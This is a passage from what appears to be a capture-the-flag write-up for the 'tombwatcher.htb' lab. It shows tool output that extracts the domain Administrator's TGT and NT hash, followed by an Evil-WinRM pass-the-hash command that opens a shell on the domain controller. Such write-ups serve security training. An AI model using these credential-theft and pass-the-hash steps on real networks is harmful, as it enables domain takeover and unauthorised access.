[*] SAN UPN: 'Administrator@tombwatcher.htb'
[*] SID:     S-1-5-21-1392491010-1358638721-2126982587-500
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Got TGT
[*] Wrote credential cache to 'administrator.ccache'
[*] Got hash for 'administrator@tombwatcher.htb':
    aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

With the Administrator NT hash, I drop straight into an interactive shell and get root:

```powershell
*Evil-WinRM* -i dc01.tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
```
